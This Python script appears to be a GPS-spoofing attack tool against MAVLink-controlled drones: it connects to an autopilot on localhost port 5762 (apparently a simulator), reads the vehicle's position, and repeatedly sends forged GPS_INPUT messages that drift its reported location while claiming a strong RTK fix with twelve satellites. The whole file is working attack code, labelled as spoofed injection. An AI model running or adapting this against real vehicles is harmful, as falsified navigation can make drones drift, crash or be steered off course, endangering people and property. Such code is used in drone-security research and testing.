from pymavlink import mavutil
import time
import random

def get_random_union_value():
    """
    Generates a random float over the union of
    [-0.0001, -0.00005] and [0.00005, 0.0001].
    """
    # Total width of one interval is 0.0004
    # We pick a random value in [0.00005, 0.0001]
    val = random.uniform(0.00005, 0.0001)

    # Randomly flip the sign to cover the negative interval
    if random.random() < 0.5:
        return -val
    return val

def inject_fake_gps():
    mav = mavutil.mavlink_connection('tcp:localhost:5762')
    mav.wait_heartbeat()
    print("[+] Connected to drone")
    
    mav.mav.request_data_stream_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_DATA_STREAM_POSITION,
        10, # Rate in Hz
        1 # Start sending (0 to stop)
    )
    i = 0
    while True:
        msg = mav.recv_match(type='GLOBAL_POSITION_INT', blocking=True)
        if msg:
            # Latitude and Longitude are in degrees * 10^7, convert to float degrees
            latitude = msg.lat #/ 1e7
            longitude = msg.lon #/ 1e7
            # Altitude is in meters * 1000, convert to meters
            altitude_amsl = msg.alt #/ 1000.0 # Altitude above Mean Sea Level
            
            print(f"Lat: {latitude:.6f}, Lon: {longitude:.6f}, Alt (AMSL): {altitude_amsl:.2f}m")
            injected_lat = latitude + 0.0001*1e7*i/600#0.0001*1e7#get_random_union_value()*1e7
            injected_lon = longitude + 0.0001*1e7*i/600#0.0001*1e7#get_random_union_value()*1e7
            injected_alt = altitude_amsl/1000
        
        mav.mav.gps_input_send(
            time_usec=int(time.time() * 1e6),
            gps_id=1,  # Secondary GPS
            ignore_flags=0,
            time_week=0,
            time_week_ms=0,
            fix_type=6,
            lat=int(injected_lat),
            lon=int(injected_lon),
            alt=int(injected_alt),
            hdop=0.8,#50,
            vdop=1.2,#50,
            vn=0,#msg.vn,#0,
            ve=0,#msg.ve,#0,
            vd=0,#msg.vd,#0,
            speed_accuracy=0.1,#0,
            horiz_accuracy=1.0,#0,
            vert_accuracy=1.5,#0,
            satellites_visible=12,#10,
            yaw=0
        )
        print("[!] Injected spoofed GPS_INPUT (gps_id=1)")
        #time.sleep(1)
        print(i)
        i += 1

if __name__ == "__main__":
    inject_fake_gps()
